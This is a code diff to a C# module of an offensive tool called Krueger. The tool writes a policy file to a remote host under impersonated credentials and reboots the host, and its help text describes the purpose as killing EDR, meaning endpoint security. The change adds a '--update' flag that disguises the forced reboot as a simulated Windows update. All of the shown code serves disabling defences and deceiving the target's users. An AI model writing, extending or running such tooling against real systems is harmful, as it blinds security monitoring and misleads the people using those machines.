@@ -23,7 +23,8 @@ namespace Krueger.Modules
                 "\t--host <hostname>        -     Kill EDR on a specified host\n" +
                 "\t--username <username>    -     A username to use for authentication\n" +
                 "\t--domain <domain>        -     A domain to use for authentication\n" +
-                "\t--password <password>    -     A password to use for authentication\n"
+                "\t--password <password>    -     A password to use for authentication\n" +
+                "\t--update                 -     Simulate a Windows update to reboot in 30 seconds\n"
                 ;
 
             Console.WriteLine(help);
@@ -77,9 +78,10 @@ namespace Krueger.Modules
                 string username = null;
                 string password = null;
                 string domain = null;
+                string update = null;
 
                 string[] flags = { "--host" , "--username", "--password", "--domain" };
-                string[] options = { };
+                string[] options = { "--update" };
 
                 Dictionary<string, string> cmd = Parse(args, flags, options);
                 if (cmd == null)
@@ -91,6 +93,7 @@ namespace Krueger.Modules
                 cmd.TryGetValue("--username", out username);
                 cmd.TryGetValue("--password", out password);
                 cmd.TryGetValue("--domain", out domain);
+                cmd.TryGetValue("--update", out update);
 
                 WindowsImpersonationContext impersonationContext = null;
 
@@ -128,14 +131,15 @@ namespace Krueger.Modules
                     byte[] policy = Modules.Policy.ReadPolicy();
                     File.WriteAllBytes(target, policy);
                     Console.WriteLine("[+] Moved policy successfully");
-                    bool rebooted = Reboot.reboot(host);
+                    bool warn = Convert.ToBoolean(update);
+                    bool rebooted = Reboot.reboot(host, warn);
                     if (rebooted)
                     {
-                        Console.WriteLine("[+] Rebooted target");
+                        Console.WriteLine("[+] Triggered reboot");
                     }
                     else
                     {
-                        Console.WriteLine("[!] Target has not been rebooted");
+                        Console.WriteLine("[!] Could not trigger reboot");
                     }
                     impersonationContext.Undo();
                 }
